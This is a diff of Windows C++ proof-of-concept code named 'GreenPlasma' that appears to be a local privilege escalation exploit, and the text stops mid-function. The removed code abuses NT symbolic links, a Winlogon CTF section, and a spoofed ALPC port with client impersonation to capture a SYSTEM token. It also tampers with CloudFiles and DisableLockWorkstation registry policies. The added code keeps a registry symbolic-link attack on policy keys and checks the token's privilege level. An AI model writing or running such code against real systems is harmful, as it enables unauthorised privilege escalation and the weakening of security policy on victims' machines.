@@ -5,7 +5,6 @@
 #include <Windows.h>
 #include <winternl.h>
 #undef WIN32_NO_STATUS
-#include <aclapi.h>
 #include <ntstatus.h>
 #include <sddl.h>
 #include <conio.h>
@@ -13,2537 +12,1185 @@
 #include <stdlib.h>
 #include <string.h>
 
-#pragma comment(lib, "ntdll.lib")
 #pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "ntdll.lib")
 
-// Local compatibility constants and PoC defaults.
 #ifndef NT_SUCCESS
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 #endif
 
-#ifndef STATUS_UNSUCCESSFUL
-#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
-#endif
+typedef NTSTATUS(WINAPI* PFN_NtDeleteKey)(HANDLE KeyHandle);
 
-#ifndef STATUS_BUFFER_TOO_SMALL
-#define STATUS_BUFFER_TOO_SMALL ((NTSTATUS)0xC0000023L)
-#endif
+static PFN_NtDeleteKey g_NtDeleteKey = NULL;
 
-#ifndef STATUS_INFO_LENGTH_MISMATCH
-#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
-#endif
-
-#ifndef STATUS_TIMEOUT
-#define STATUS_TIMEOUT ((NTSTATUS)0x00000102L)
-#endif
-
-#ifndef SECTION_QUERY
-#define SECTION_QUERY 0x0001
-#endif
-
-#ifndef SECTION_MAP_WRITE
-#define SECTION_MAP_WRITE 0x0002
-#endif
-
-#ifndef SECTION_MAP_READ
-#define SECTION_MAP_READ 0x0004
-#endif
-
-#ifndef LPC_CONNECTION_REQUEST
-#define LPC_CONNECTION_REQUEST 2
-#endif
-
-#ifndef ALPC_PORT_ALLOW_IMPERSONATION
-#define ALPC_PORT_ALLOW_IMPERSONATION 0x20000
-#endif
-
-#ifndef GP_OPEN_TIMEOUT_MS
-#define GP_OPEN_TIMEOUT_MS 30000
-#endif
-
-#ifndef GP_OPEN_POLL_MS
-#define GP_OPEN_POLL_MS 20
-#endif
-
-#ifndef GP_OPEN_STATUS_LOG_MS
-#define GP_OPEN_STATUS_LOG_MS 1000
-#endif
-
-#ifndef GP_DESKTOP_TIMEOUT_MS
-#define GP_DESKTOP_TIMEOUT_MS 30000
-#endif
-
-#ifndef GP_ENABLE_SECTION_DUMP
-#define GP_ENABLE_SECTION_DUMP 0
-#endif
-
-#ifndef GP_VERBOSE_TRACE
-#define GP_VERBOSE_TRACE 0
-#endif
-
-#define GP_OBJECT_BASIC_INFORMATION_CLASS 0
-#define GP_OBJECT_NAME_INFORMATION_CLASS 1
-#define GP_OBJECT_TYPE_INFORMATION_CLASS 2
-#define GP_VIEW_SHARE 1
-
-// Native API declarations resolved at runtime.
-typedef NTSTATUS(WINAPI* PFN_NtCreateSymbolicLinkObject)(
-    OUT PHANDLE pHandle,
-    IN ACCESS_MASK DesiredAccess,
-    IN POBJECT_ATTRIBUTES ObjectAttributes,
-    IN PUNICODE_STRING DestinationName);
-
-typedef NTSTATUS(WINAPI* PFN_NtOpenSection)(
-    _Out_ PHANDLE SectionHandle,
-    _In_ ACCESS_MASK DesiredAccess,
-    _In_ POBJECT_ATTRIBUTES ObjectAttributes);
-
-typedef NTSTATUS(WINAPI* PFN_NtDeleteKey)(HANDLE hkey);
-
-typedef NTSTATUS(WINAPI* PFN_NtQueryObject)(
-    HANDLE Handle,
-    ULONG ObjectInformationClass,
-    PVOID ObjectInformation,
-    ULONG ObjectInformationLength,
-    PULONG ReturnLength);
-
-typedef NTSTATUS(WINAPI* PFN_NtMapViewOfSection)(
-    HANDLE SectionHandle,
-    HANDLE ProcessHandle,
-    PVOID* BaseAddress,
-    ULONG_PTR ZeroBits,
-    SIZE_T CommitSize,
-    PLARGE_INTEGER SectionOffset,
-    PSIZE_T ViewSize,
-    ULONG InheritDisposition,
-    ULONG AllocationType,
-    ULONG Win32Protect);
-
-typedef NTSTATUS(WINAPI* PFN_NtUnmapViewOfSection)(
-    HANDLE ProcessHandle,
-    PVOID BaseAddress);
-
-typedef DWORD(WINAPI* PFN_CfAbortOperation)(DWORD pid, void* unknown, DWORD flags);
-
-typedef struct _GP_OBJECT_BASIC_INFORMATION {
-    ULONG Attributes;
-    ACCESS_MASK GrantedAccess;
-    ULONG HandleCount;
-    ULONG PointerCount;
-    ULONG Reserved[10];
-} GP_OBJECT_BASIC_INFORMATION, *PGP_OBJECT_BASIC_INFORMATION;
-
-typedef short CSHORT;
-
-typedef struct _ALPC_PORT_ATTRIBUTES {
-    ULONG Flags;
-    SECURITY_QUALITY_OF_SERVICE SecurityQos;
-    SIZE_T MaxMessageLength;
-    SIZE_T MemoryBandwidth;
-    SIZE_T MaxPoolUsage;
-    SIZE_T MaxSectionSize;
-    SIZE_T MaxViewSize;
-    SIZE_T MaxTotalViewSize;
-    ULONG DupObjectTypes;
-} ALPC_PORT_ATTRIBUTES, *PALPC_PORT_ATTRIBUTES;
-
-typedef struct _PORT_MESSAGE {
-    union {
-        struct {
-            CSHORT DataLength;
-            CSHORT TotalLength;
-        } s1;
-        ULONG Length;
-    } u1;
-    union {
-        struct {
-            CSHORT Type;
-            CSHORT DataInfoOffset;
-        } s2;
-        ULONG Number;
-    } u2;
-    CLIENT_ID ClientId;
-    ULONG MessageId;
-    union {
-        SIZE_T ClientViewSize;
-        ULONG CallbackId;
-    };
-} PORT_MESSAGE, *PPORT_MESSAGE;
-
-typedef struct _ALPC_MESSAGE {
-    PORT_MESSAGE PortHeader;
-    BYTE PortMessage[0x1000];
-} ALPC_MESSAGE, *PALPC_MESSAGE;
-
-typedef NTSTATUS(WINAPI* PFN_NtAlpcCreatePort)(PHANDLE, POBJECT_ATTRIBUTES, PALPC_PORT_ATTRIBUTES);
-typedef NTSTATUS(WINAPI* PFN_NtAlpcSendWaitReceivePort)(HANDLE, ULONG, PPORT_MESSAGE, PVOID, PPORT_MESSAGE, PSIZE_T, PVOID, PLARGE_INTEGER);
-typedef NTSTATUS(WINAPI* PFN_NtAlpcAcceptConnectPort)(PHANDLE, HANDLE, ULONG, POBJECT_ATTRIBUTES, PALPC_PORT_ATTRIBUTES, PVOID, PPORT_MESSAGE, PVOID, BOOLEAN);
-typedef NTSTATUS(WINAPI* PFN_NtAlpcImpersonateClientOfPort)(HANDLE, PPORT_MESSAGE, PVOID);
-
-enum class GpMapMode {
-    None,
-    ReadOnly,
-    ReadWrite
-};
-
-struct GpSectionView {
-    PVOID base;
-    SIZE_T size;
-    bool writable;
-    NTSTATUS status;
-    GpMapMode mode;
-};
-
-struct GpDesktopTimingEvidence {
-    bool observed;
-    bool timedOut;
-    DWORD elapsedMs;
-    DWORD lastError;
-    DWORD polls;
-};
-
-enum class GpStatus {
-    Ok,
-    InvalidInput,
-    LinkFailed,
-    TriggerFailed,
-    SectionTimeout,
-    AccessDenied,
-    MapFailed,
-    RegistryFailed,
-    TimingMiss,
-    MutationFailed,
-    Skipped
-};
-
-struct GpRegistryEvidence {
-    bool attempted;
-    bool succeeded;
-    bool cloudFilesKeyCreated;
-    bool policiesSystemKeyCreated;
-    bool blockedAppsLinkCreated;
-    bool linkedTargetTouched;
-    bool cloudFilesDaclSet;
-    bool linkValueSet;
-    bool policiesDaclSet;
-    bool disableLockSet;
-    DWORD win32Error;
-};
-
-struct GpAlpcMutationEvidence {
-    bool attempted;
-    bool verified;
-    ULONG oldVersion;
-    ULONG oldFlags;
-    ULONG newVersion;
-    ULONG newFlags;
-};
-
-struct GpRunEvidence {
-    bool apisResolved;
-    bool namesBuilt;
-    bool linkCreated;
-    bool triggerStarted;
-    bool lockAttempted;
-    bool lockSucceeded;
-    DWORD sessionId;
-    DWORD triggerWin32Error;
-    DWORD lockWin32Error;
-    NTSTATUS linkStatus;
-    NTSTATUS sectionOpenStatus;
-    DWORD sectionOpenElapsedMs;
-    HANDLE linkHandle;
-    HANDLE sectionHandle;
-    ACCESS_MASK grantedAccess;
-    DWORD sectionFingerprint;
-    SIZE_T fingerprintBytes;
-    GpSectionView view;
-    GpRegistryEvidence registry;
-    GpDesktopTimingEvidence desktopTiming;
-    GpAlpcMutationEvidence alpc;
-    HANDLE capturedSystemToken;
-};
-
-struct GpBlockedSinkResult {
-    bool implemented;
-    const wchar_t* reason;
-    GpStatus preconditionStatus;
-};
-
-struct GpSinkRequest {
-    bool requestSystemShell;
-    bool requestDllLoad;
-    bool requestCodeExecution;
-    const wchar_t* alpcPortName;
-    const wchar_t* dllPath;
-    const void* entryPoint;
-};
-
-// Runtime API pointers and non-operational sink request markers.
-static PFN_NtAlpcCreatePort _NtAlpcCreatePort = NULL;
-static PFN_NtAlpcSendWaitReceivePort _NtAlpcSendWaitReceivePort = NULL;
-static PFN_NtAlpcAcceptConnectPort _NtAlpcAcceptConnectPort = NULL;
-static PFN_NtAlpcImpersonateClientOfPort _NtAlpcImpersonateClientOfPort = NULL;
-static PFN_NtCreateSymbolicLinkObject _NtCreateSymbolicLinkObject = NULL;
-static PFN_NtOpenSection _NtOpenSection = NULL;
-static PFN_NtDeleteKey _NtDeleteKey = NULL;
-static PFN_NtQueryObject _NtQueryObject = NULL;
-static PFN_NtMapViewOfSection _NtMapViewOfSection = NULL;
-static PFN_NtUnmapViewOfSection _NtUnmapViewOfSection = NULL;
-static PFN_CfAbortOperation CfAbortOperation = NULL;
-
-static const wchar_t GP_DEFAULT_TARGET_NAME[] = L"\\BaseNamedObjects\\CTFMON_DEAD";
-static const wchar_t GP_SESSION_SECTION_FORMAT[] = L"\\Sessions\\%lu\\BaseNamedObjects\\CTF.AsmListCache.FMPWinlogon%lu";
-static const wchar_t GP_ALPC_PORT_NAME[] = L"\\RPC Control\\GreenPlasmaSpoofedPort";
-static const wchar_t GP_REG_CLOUDFILES[] = L"Software\\Policies\\Microsoft\\CloudFiles";
-static const wchar_t GP_REG_BLOCKED_APPS[] = L"Software\\Policies\\Microsoft\\CloudFiles\\BlockedApps";
-static const wchar_t GP_REG_SYSTEM_POLICIES[] = L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
-static const wchar_t GP_REG_CLOUDFILES_NAMED[] = L"CURRENT_USER\\Software\\Policies\\Microsoft\\CloudFiles";
-static const wchar_t GP_REG_BLOCKED_APPS_NAMED[] = L"CURRENT_USER\\Software\\Policies\\Microsoft\\CloudFiles\\BlockedApps";
-static const wchar_t GP_REG_SYSTEM_POLICIES_NAMED[] = L"CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
 static const wchar_t GP_REG_LINK_VALUE_NAME[] = L"SymbolicLinkValue";
-static const wchar_t GP_REG_DISABLE_LOCK_VALUE_NAME[] = L"DisableLockWorkstation";
-static const wchar_t GP_BLOCKED_DLL_REQUEST[] = L"<blocked-dll-load-request>";
-static const REGSAM GP_REG_SYSTEM_TARGET_ACCESS_MASKS[] = {
-    KEY_READ,
-    KEY_SET_VALUE,
-    KEY_READ | KEY_SET_VALUE,
-    KEY_READ | KEY_SET_VALUE | WRITE_DAC
+static const wchar_t GP_PAINT_HAM_SOURCE[] =
+    L"Software\\Microsoft\\Windows NT\\CurrentVersion\\HostActivityManager\\CommitHistory\\Microsoft.Paint_8wekyb3d8bbwe!App";
+static const wchar_t GP_DEFAULT_TARGET[] = L"Software\\Policies\\Microsoft\\Windows\\CloudContent";
+static const wchar_t GP_MIXED_VALUE_NAME[] = L"Mixed";
+static const DWORD GP_DEFAULT_OBSERVE_MS = 180000;
+static const DWORD GP_DEFAULT_SETTLE_MS = 30000;
+static const DWORD GP_MAX_OBSERVE_MS = 600000;
+static const DWORD GP_MAX_SETTLE_MS = 300000;
+static const DWORD GP_MAX_VALUE_BYTES = 4096;
+
+enum class GpTriggerMode {
+    None,
+    Manual
 };
 
-// Hypothesis layout for path-like state mutation. This is not a verified schema.
-#pragma pack(push, 1)
-typedef struct _GP_CACHE_LAYOUT_HYPOTHESIS {
-    ULONG Version;
-    ULONG Flags;
-    ULONG OffsetToData;
-    wchar_t AlpcServerPort[MAX_PATH];
-} GP_CACHE_LAYOUT_HYPOTHESIS, *PGP_CACHE_LAYOUT_HYPOTHESIS;
-#pragma pack(pop)
+struct GpRequest {
+    const wchar_t* targetSubKey;
+    GpTriggerMode triggerMode;
+    DWORD observeMs;
+    DWORD settleMs;
+    bool hold;
+};
 
-// Output helpers. Default output is concise; verbose trace keeps timestamps and snapshots.
-static void PrintTimestamp(const wchar_t* phase)
+struct GpTokenEvidence {
+    bool queried;
+    wchar_t sid[192];
+    const wchar_t* integrity;
+    DWORD integrityRid;
+    bool elevated;
+    TOKEN_ELEVATION_TYPE elevationType;
+    bool admin;
+};
+
+struct GpSourceControl {
+    bool keep;
+    bool exists;
+    bool openWithOpenLinkOption;
+    bool isRegLink;
+    bool parentCreate;
+    DWORD queryError;
+    DWORD openLinkError;
+    DWORD linkValueError;
+    DWORD parentError;
+    const wchar_t* reason;
+};
+
+struct GpTargetBoundary {
+    bool keep;
+    bool query;
+    bool setValue;
+    bool writeDac;
+    bool parentQuery;
+    bool parentCreate;
+    DWORD queryError;
+    DWORD setValueError;
+    DWORD writeDacError;
+    DWORD parentQueryError;
+    DWORD parentCreateError;
+    const wchar_t* reason;
+};
+
+struct GpRegistrySnapshot {
+    bool queried;
+    DWORD win32Error;
+    DWORD valueCount;
+    DWORD subKeyCount;
+    FILETIME lastWrite;
+    ULONGLONG hash;
+    bool mixedPresent;
+    DWORD mixedType;
+    DWORD mixedBytes;
+    ULONGLONG mixedHash;
+    ULONGLONG mixedQword;
+    bool mixedQwordValid;
+};
+
+static const wchar_t* TriggerModeName(GpTriggerMode mode)
 {
-#if GP_VERBOSE_TRACE
-    SYSTEMTIME st;
-    GetLocalTime(&st);
-    wprintf(L"[%04u-%02u-%02u %02u:%02u:%02u.%03u] [%ls] ",
-        st.wYear,
-        st.wMonth,
-        st.wDay,
-        st.wHour,
-        st.wMinute,
-        st.wSecond,
-        st.wMilliseconds,
-        phase);
-#else
-    UNREFERENCED_PARAMETER(phase);
-#endif
-}
-
-static void TraceLine(const wchar_t* phase, const wchar_t* message)
-{
-#if GP_VERBOSE_TRACE
-    PrintTimestamp(phase);
-    wprintf(L"%ls\n", message);
-#else
-    UNREFERENCED_PARAMETER(phase);
-    UNREFERENCED_PARAMETER(message);
-#endif
-}
-
-static void TraceWin32(const wchar_t* phase, const wchar_t* label, DWORD code)
-{
-#if GP_VERBOSE_TRACE
-    PrintTimestamp(phase);
-    wprintf(L"%ls: %lu (0x%08lx)\n", label, code, code);
-#else
-    UNREFERENCED_PARAMETER(phase);
-    UNREFERENCED_PARAMETER(label);
-    if (code != ERROR_SUCCESS) {
-        wprintf(L"W32=0x%08lx\n", code);
-    }
-#endif
-}
-
-static void TraceWin32Context(const wchar_t* scope, const wchar_t* api, const wchar_t* target, DWORD code)
-{
-    if (code == ERROR_SUCCESS) {
-        return;
-    }
-
-#if GP_VERBOSE_TRACE
-    PrintTimestamp(scope ? scope : L"W32");
-#endif
-    wprintf(
-        L"%ls=fail api=%ls",
-        scope ? scope : L"win32",
-        api ? api : L"<unknown>");
-    if (target && target[0]) {
-        wprintf(L" target=%ls", target);
-    }
-    wprintf(L" code=%lu W32=0x%08lx\n", code, code);
-}
-
-static void TraceWin32WarningContext(const wchar_t* scope, const wchar_t* api, const wchar_t* target, DWORD code)
-{
-    if (code == ERROR_SUCCESS) {
-        return;
-    }
-
-#if GP_VERBOSE_TRACE
-    PrintTimestamp(scope ? scope : L"W32");
-#endif
-    wprintf(
-        L"%ls=warn api=%ls",
-        scope ? scope : L"win32",
-        api ? api : L"<unknown>");
-    if (target && target[0]) {
-        wprintf(L" target=%ls", target);
-    }
-    wprintf(L" code=%lu W32=0x%08lx\n", code, code);
-}
-
-static void TraceNtStatus(const wchar_t* phase, const wchar_t* label, NTSTATUS status)
-{
-#if GP_VERBOSE_TRACE
-    PrintTimestamp(phase);
-    wprintf(L"%ls: 0x%08lx\n", label, (DWORD)status);
-#else
-    UNREFERENCED_PARAMETER(phase);
-    UNREFERENCED_PARAMETER(label);
-    if (!NT_SUCCESS(status)) {
-        wprintf(L"NT=0x%08lx\n", (DWORD)status);
-    }
-#endif
-}
-
-static void TraceNtStatusContext(const wchar_t* scope, const wchar_t* api, const wchar_t* target, NTSTATUS status)
-{
-    if (NT_SUCCESS(status)) {
-        return;
-    }
-
-#if GP_VERBOSE_TRACE
-    PrintTimestamp(scope ? scope : L"NT");
-#endif
-    wprintf(
-        L"%ls=fail api=%ls",
-        scope ? scope : L"nt",
-        api ? api : L"<unknown>");
-    if (target && target[0]) {
-        wprintf(L" target=%ls", target);
-    }
-    wprintf(L" NT=0x%08lx\n", (DWORD)status);
-}
-
-static const wchar_t* GpStatusName(GpStatus status)
-{
-    switch (status) {
-    case GpStatus::Ok:
-        return L"ok";
-    case GpStatus::InvalidInput:
-        return L"invalid-input";
-    case GpStatus::LinkFailed:
-        return L"link-failed";
-    case GpStatus::TriggerFailed:
-        return L"trigger-failed";
-    case GpStatus::SectionTimeout:
-        return L"section-timeout";
-    case GpStatus::AccessDenied:
-        return L"access-denied";
-    case GpStatus::MapFailed:
-        return L"map-failed";
-    case GpStatus::RegistryFailed:
-        return L"registry-failed";
-    case GpStatus::TimingMiss:
-        return L"timing-miss";
-    case GpStatus::MutationFailed:
-        return L"mutation-failed";
-    case GpStatus::Skipped:
-        return L"skipped";
+    switch (mode) {
+    case GpTriggerMode::None:
+        return L"none";
+    case GpTriggerMode::Manual:
+        return L"manual";
     default:
         return L"unknown";
     }
 }
 
-static const wchar_t* GpMapModeName(GpMapMode mode)
+static const wchar_t* ElevationTypeName(TOKEN_ELEVATION_TYPE type)
 {
-    switch (mode) {
-    case GpMapMode::ReadWrite:
-        return L"rw";
-    case GpMapMode::ReadOnly:
-        return L"ro";
-    case GpMapMode::None:
+    switch (type) {
+    case TokenElevationTypeDefault:
+        return L"default";
+    case TokenElevationTypeFull:
+        return L"full";
+    case TokenElevationTypeLimited:
+        return L"limited";
     default:
-        return L"none";
+        return L"unknown";
     }
 }
 
-// API resolution and Cloud Files trigger wrapper.
+static const wchar_t* IntegrityName(DWORD rid)
+{
+    if (rid >= SECURITY_MANDATORY_SYSTEM_RID) {
+        return L"system";
+    }
+    if (rid >= SECURITY_MANDATORY_HIGH_RID) {
+        return L"high";
+    }
+    if (rid >= SECURITY_MANDATORY_MEDIUM_RID) {
+        return L"medium";
+    }
+    if (rid >= SECURITY_MANDATORY_LOW_RID) {
+        return L"low";
+    }
+    return L"unknown";
+}
+
+static void Fnv1a64Update(ULONGLONG* hash, const void* data, SIZE_T bytes)
+{
+    const BYTE* p = (const BYTE*)data;
+    if (!hash || (!data && bytes != 0)) {
+        return;
+    }
+    for (SIZE_T i = 0; i < bytes; ++i) {
+        *hash ^= p[i];
+        *hash *= 1099511628211ULL;
+    }
+}
+
+static void Fnv1a64UpdateWide(ULONGLONG* hash, const wchar_t* text)
+{
+    if (text) {
+        Fnv1a64Update(hash, text, wcslen(text) * sizeof(wchar_t));
+    }
+}
+
 static bool ResolveNativeApis()
 {
     HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
     if (!ntdll) {
-        TraceWin32(L"P0", L"api", GetLastError());
+        ntdll = LoadLibraryW(L"ntdll.dll");
+    }
+    if (!ntdll) {
+        wprintf(L"native_api=fail module=ntdll W32=0x%08lx\n", GetLastError());
         return false;
     }
 
-    _NtCreateSymbolicLinkObject = (PFN_NtCreateSymbolicLinkObject)GetProcAddress(ntdll, "NtCreateSymbolicLinkObject");
-    _NtOpenSection = (PFN_NtOpenSection)GetProcAddress(ntdll, "NtOpenSection");
-    _NtDeleteKey = (PFN_NtDeleteKey)GetProcAddress(ntdll, "NtDeleteKey");
-    _NtQueryObject = (PFN_NtQueryObject)GetProcAddress(ntdll, "NtQueryObject");
-    _NtMapViewOfSection = (PFN_NtMapViewOfSection)GetProcAddress(ntdll, "NtMapViewOfSection");
-    _NtUnmapViewOfSection = (PFN_NtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
-    _NtAlpcCreatePort = (PFN_NtAlpcCreatePort)GetProcAddress(ntdll, "NtAlpcCreatePort");
-    _NtAlpcSendWaitReceivePort = (PFN_NtAlpcSendWaitReceivePort)GetProcAddress(ntdll, "NtAlpcSendWaitReceivePort");
-    _NtAlpcAcceptConnectPort = (PFN_NtAlpcAcceptConnectPort)GetProcAddress(ntdll, "NtAlpcAcceptConnectPort");
-    _NtAlpcImpersonateClientOfPort = (PFN_NtAlpcImpersonateClientOfPort)GetProcAddress(ntdll, "NtAlpcImpersonateClientOfPort");
-
-    HMODULE cldapi = LoadLibraryW(L"cldapi.dll");
-    if (cldapi) {
-        CfAbortOperation = (PFN_CfAbortOperation)GetProcAddress(cldapi, "CfAbortOperation");
-    }
-
-    if (!_NtCreateSymbolicLinkObject ||
-        !_NtOpenSection ||
-        !_NtDeleteKey ||
-        !_NtQueryObject ||
-        !_NtMapViewOfSection ||
-        !_NtUnmapViewOfSection ||
-        !_NtAlpcCreatePort || 
-        !_NtAlpcSendWaitReceivePort || 
-        !_NtAlpcAcceptConnectPort || 
-        !_NtAlpcImpersonateClientOfPort) {
-        TraceLine(L"P0", L"api");
+    g_NtDeleteKey = (PFN_NtDeleteKey)GetProcAddress(ntdll, "NtDeleteKey");
+    if (!g_NtDeleteKey) {
+        wprintf(L"native_api=fail name=NtDeleteKey W32=0x%08lx\n", GetLastError());
         return false;
     }
-
     return true;
 }
 
-static DWORD CallCfAbortOperation(const wchar_t* phase)
+static bool QueryCurrentUserSidString(wchar_t* sidBuffer, SIZE_T sidBufferCount)
 {
-    if (!CfAbortOperation) {
-        TraceLine(phase, L"cf");
-        return ERROR_PROC_NOT_FOUND;
+    HANDLE token = NULL;
+    PTOKEN_USER tokenUser = NULL;
+    DWORD needed = 0;
+    LPWSTR sidString = NULL;
+    bool ok = false;
+
+    if (!sidBuffer || sidBufferCount == 0) {
+        return false;
+    }
+    sidBuffer[0] = L'\0';
+
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
+        return false;
+    }
+    GetTokenInformation(token, TokenUser, NULL, 0, &needed);
+    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER || needed == 0) {
+        goto done;
     }
 
-    DWORD res = CfAbortOperation(GetCurrentProcessId(), NULL, 0x2);
-    TraceWin32(phase, L"cf", res);
-    return res;
+    tokenUser = (PTOKEN_USER)malloc(needed);
+    if (!tokenUser) {
+        goto done;
+    }
+    if (!GetTokenInformation(token, TokenUser, tokenUser, needed, &needed)) {
+        goto done;
+    }
+    if (!ConvertSidToStringSidW(tokenUser->User.Sid, &sidString)) {
+        goto done;
+    }
+
+    wcsncpy_s(sidBuffer, sidBufferCount, sidString, _TRUNCATE);
+    ok = true;
+
+done:
+    if (sidString) {
+        LocalFree(sidString);
+    }
+    if (tokenUser) {
+        free(tokenUser);
+    }
+    if (token) {
+        CloseHandle(token);
+    }
+    return ok;
 }
 
-// Optional object and registry inspection helpers.
-static void PrintUnicodeInfo(const wchar_t* label, PUNICODE_STRING value)
+static bool QueryAdminMembership(HANDLE token)
 {
-#if GP_VERBOSE_TRACE
-    PrintTimestamp(L"SNAPSHOT");
-    if (!value || !value->Buffer || !value->Length) {
-        wprintf(L"%ls=<empty>\n", label);
-        return;
-    }
+    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
+    PSID adminSid = NULL;
+    BOOL isMember = FALSE;
 
-    wprintf(L"%ls=%.*ls\n", label, value->Length / sizeof(wchar_t), value->Buffer);
-#else
-    UNREFERENCED_PARAMETER(label);
-    UNREFERENCED_PARAMETER(value);
-#endif
-}
-
-static void QueryObjectUnicode(HANDLE handle, ULONG infoClass, const wchar_t* label)
-{
-#if GP_VERBOSE_TRACE
-    ULONG length = 0x2000;
-    ULONG returned = 0;
-    PBYTE buffer = (PBYTE)malloc(length);
-    if (!buffer) {
-        return;
-    }
-
-    NTSTATUS status = _NtQueryObject(handle, infoClass, buffer, length, &returned);
-    if ((status == STATUS_INFO_LENGTH_MISMATCH || status == STATUS_BUFFER_TOO_SMALL) && returned > length) {
-        free(buffer);
-        length = returned + sizeof(UNICODE_STRING);
-        buffer = (PBYTE)malloc(length);
-        if (!buffer) {
-            return;
-        }
-        status = _NtQueryObject(handle, infoClass, buffer, length, &returned);
-    }
-
-    if (NT_SUCCESS(status)) {
-        PrintUnicodeInfo(label, (PUNICODE_STRING)buffer);
-    }
-
-    free(buffer);
-#else
-    UNREFERENCED_PARAMETER(handle);
-    UNREFERENCED_PARAMETER(infoClass);
-    UNREFERENCED_PARAMETER(label);
-#endif
-}
-
-static bool QueryBasic(HANDLE handle, GP_OBJECT_BASIC_INFORMATION* basic)
-{
-    ULONG returned = 0;
-    NTSTATUS status = _NtQueryObject(
-        handle,
-        GP_OBJECT_BASIC_INFORMATION_CLASS,
-        basic,
-        sizeof(*basic),
-        &returned);
-
-    if (!NT_SUCCESS(status)) {
-        TraceNtStatus(L"SNAPSHOT", L"basic", status);
+    if (!AllocateAndInitializeSid(
+        &ntAuthority,
+        2,
+        SECURITY_BUILTIN_DOMAIN_RID,
+        DOMAIN_ALIAS_RID_ADMINS,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
+        &adminSid)) {
         return false;
     }
 
-    return true;
+    if (!CheckTokenMembership(token, adminSid, &isMember)) {
+        isMember = FALSE;
+    }
+    FreeSid(adminSid);
+    return isMember ? true : false;
 }
 
-static bool CaptureGrantedAccess(HANDLE handle, ACCESS_MASK* access)
+static GpTokenEvidence CaptureTokenEvidence()
 {
-    GP_OBJECT_BASIC_INFORMATION basic = { 0 };
+    GpTokenEvidence evidence = { 0 };
+    HANDLE token = NULL;
+    PTOKEN_USER tokenUser = NULL;
+    PTOKEN_MANDATORY_LABEL integrity = NULL;
+    DWORD needed = 0;
+    DWORD returned = 0;
+    LPWSTR sidString = NULL;
+    TOKEN_ELEVATION elevation = { 0 };
+    TOKEN_ELEVATION_TYPE elevationType = TokenElevationTypeDefault;
 
-    if (!access) {
-        return false;
+    evidence.integrity = L"unknown";
+
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
+        wprintf(L"start_token query=0 W32=0x%08lx\n", GetLastError());
+        return evidence;
     }
 
-    *access = 0;
-    if (!QueryBasic(handle, &basic)) {
-        return false;
-    }
-
-    *access = basic.GrantedAccess;
-    return true;
-}
-
-static void PrintAccessEvidence(ACCESS_MASK access)
-{
-    wprintf(
-        L"access=0x%08lx query=%u read=%u write=%u dac=%u owner=%u\n",
-        access,
-        (access & SECTION_QUERY) ? 1 : 0,
-        (access & SECTION_MAP_READ) ? 1 : 0,
-        (access & SECTION_MAP_WRITE) ? 1 : 0,
-        (access & WRITE_DAC) ? 1 : 0,
-        (access & WRITE_OWNER) ? 1 : 0);
-}
-
-static void PrintLabeledAccessEvidence(const wchar_t* label, ACCESS_MASK access)
-{
-    wprintf(
-        L"%ls=0x%08lx query=%u read=%u write=%u dac=%u owner=%u\n",
-        label ? label : L"access",
-        access,
-        (access & SECTION_QUERY) ? 1 : 0,
-        (access & SECTION_MAP_READ) ? 1 : 0,
-        (access & SECTION_MAP_WRITE) ? 1 : 0,
-        (access & WRITE_DAC) ? 1 : 0,
-        (access & WRITE_OWNER) ? 1 : 0);
-}
-
-static void LogKernelObjectSecurity(HANDLE handle)
-{
-#if GP_VERBOSE_TRACE
-    PSECURITY_DESCRIPTOR sd = NULL;
-    PSID owner = NULL;
-    PSID group = NULL;
-    PACL dacl = NULL;
-
-    DWORD res = GetSecurityInfo(
-        handle,
-        SE_KERNEL_OBJECT,
-        OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION,
-        &owner,
-        &group,
-        &dacl,
-        NULL,
-        &sd);
-
-    if (res != ERROR_SUCCESS) {
-        TraceWin32(L"SECURITY", L"GetSecurityInfo", res);
-        return;
-    }
-
-    LPWSTR sddl = NULL;
-    if (ConvertSecurityDescriptorToStringSecurityDescriptorW(
-        sd,
-        SDDL_REVISION_1,
-        OWNER_SECURITY_INFORMATION | GROUP_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION,
-        &sddl,
-        NULL)) {
-        PrintTimestamp(L"SECURITY");
-        wprintf(L"sddl=%ls\n", sddl);
-        LocalFree(sddl);
-    }
-
-    if (sd) {
-        LocalFree(sd);
-    }
-#else
-    UNREFERENCED_PARAMETER(handle);
-#endif
-}
-
-static void PrintObjectUnicodeBrief(HANDLE handle, ULONG infoClass, const wchar_t* label)
-{
-    ULONG length = 0x2000;
-    ULONG returned = 0;
-    PBYTE buffer = NULL;
-    NTSTATUS status = STATUS_UNSUCCESSFUL;
-
-    if (!handle || handle == INVALID_HANDLE_VALUE || !label) {
-        return;
-    }
-
-    buffer = (PBYTE)malloc(length);
-    if (!buffer) {
-        wprintf(L"%ls=fail reason=oom\n", label);
-        return;
-    }
-
-    status = _NtQueryObject(handle, infoClass, buffer, length, &returned);
-    if ((status == STATUS_INFO_LENGTH_MISMATCH || status == STATUS_BUFFER_TOO_SMALL) && returned > length) {
-        free(buffer);
-        length = returned + sizeof(UNICODE_STRING);
-        buffer = (PBYTE)malloc(length);
-        if (!buffer) {
-            wprintf(L"%ls=fail reason=oom\n", label);
-            return;
-        }
-        status = _NtQueryObject(handle, infoClass, buffer, length, &returned);
-    }
-
-    if (NT_SUCCESS(status)) {
-        PUNICODE_STRING value = (PUNICODE_STRING)buffer;
-        if (value && value->Buffer && value->Length) {
-            wprintf(L"%ls=%.*ls\n", label, (int)(value->Length / sizeof(wchar_t)), value->Buffer);
-        }
-        else {
-            wprintf(L"%ls=<empty>\n", label);
+    GetTokenInformation(token, TokenUser, NULL, 0, &needed);
